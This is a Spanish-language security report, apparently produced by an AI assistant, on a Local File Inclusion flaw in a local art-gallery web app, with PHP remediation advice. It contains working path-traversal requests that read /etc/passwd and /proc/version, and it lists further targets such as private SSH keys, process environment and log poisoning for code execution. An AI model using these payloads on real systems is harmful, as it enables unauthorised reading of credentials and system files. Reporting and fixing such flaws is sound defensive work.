# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:12:46  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante manipulación del parámetro `page` en `gallery.php`.

**Resultado:** ✅ Vulnerabilidad encontrada y explotada.

---

## Descripción de la Vulnerabilidad

### Tipo
Local File Inclusion (LFI) / Path Traversal

### Endpoint Vulnerable
```
http://web.dev.local:8081/gallery.php?page=<VALOR>
```

### Parámetro Vulnerable
- **Nombre:** `page`
- **Método:** GET

### Descripción Técnica
La aplicación incluye dinámicamente archivos basándose en el valor del parámetro `page` sin aplicar ningún tipo de sanitización ni validación. Esto permite a un atacante utilizar secuencias de path traversal (`../`) para salir del directorio raíz de la aplicación y acceder a archivos del sistema operativo.

---

## Pruebas de Explotación

### Payload 1 - Lectura de `/etc/passwd`
```
GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ✅ Éxito - Contenido del archivo devuelto:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Payload 2 - Lectura de `/proc/version`
```
GET /gallery.php?page=../../../../proc/version HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ✅ Éxito - Información del kernel revelada:
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, 
GNU ld (GNU Binutils for Ubuntu) 2.42) 
#110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026
```

### Payload 3 - Lectura de `/etc/shadow`
```
GET /gallery.php?page=../../../../etc/shadow HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** ⚠️ Sin salida visible (posiblemente protegido por permisos del sistema operativo, el proceso web no tiene acceso de lectura al fichero shadow).

---

## Impacto

| Categoría | Descripción |
|-----------|-------------|
| **Confidencialidad** | Alta - Lectura de archivos de sistema sensibles |
| **Integridad** | Baja - Solo lectura (no escritura) |
| **Disponibilidad** | Baja - No afecta la disponibilidad |
| **Severidad CVSS** | Alta (CVSS v3: ~7.5) |

### Información sensible expuesta
- Lista completa de usuarios del sistema (`/etc/passwd`)
- Versión exacta del kernel de Linux (`/proc/version`)
- Potencial acceso a archivos de configuración de aplicaciones, claves SSH, logs, etc.

---

## Vectores de Ataque Adicionales

Con esta vulnerabilidad, un atacante podría intentar leer:
- `/etc/apache2/sites-enabled/*.conf` - Configuración de Apache
- `/var/www/html/*.php` - Código fuente de la aplicación
- `/home/*/.ssh/id_rsa` - Claves SSH privadas
- `/var/log/apache2/access.log` - Logs (posible log poisoning para RCE)
- `/proc/self/environ` - Variables de entorno del proceso

---

## Recomendaciones

### Corrección Inmediata
1. **Validar y sanitizar el parámetro `page`**: Usar una lista blanca (whitelist) de valores permitidos.
2. **Eliminar la inclusión dinámica de archivos** basada en entrada del usuario.

### Ejemplo de Corrección (PHP)
```php
// ❌ Código vulnerable
$page = $_GET['page'];
include($page . '.php');

// ✅ Código seguro - usar whitelist
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'];
if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    include('error.php');
}
```

### Medidas Adicionales
- Configurar `open_basedir` en PHP para restringir el acceso al sistema de ficheros.
- Aplicar el principio de mínimo privilegio al proceso del servidor web.
- Implementar un WAF (Web Application Firewall) para detectar patrones de path traversal.
- Realizar auditorías de código y pruebas de penetración regulares.

---

## Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de **Local File Inclusion** en el parámetro `page` de `gallery.php`. Esta vulnerabilidad ha sido **confirmada y explotada** con éxito, permitiendo la lectura de archivos sensibles del sistema como `/etc/passwd` y `/proc/version`. Se recomienda aplicar las correcciones indicadas de manera inmediata.

---

*Informe generado el 2026-04-30 a las 16:12:46 UTC*
